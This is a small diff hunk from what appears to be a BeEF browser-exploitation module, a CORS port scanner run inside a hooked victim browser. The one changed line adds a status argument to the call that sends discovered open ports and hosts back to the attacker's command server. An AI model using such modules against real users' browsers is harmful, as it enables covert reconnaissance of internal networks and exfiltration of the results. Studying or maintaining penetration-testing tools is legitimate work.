@@ -166,7 +166,7 @@ beef.execute(function() {
 					{
 						known_service = "(" + default_services[port_] + ")";
 					}
-					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=CORS: Port ' + port_ + ' is OPEN ' + known_service);
+					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=CORS: Port ' + port_ + ' is OPEN ' + known_service, beef.are.status_success());
 				}
 			}
 
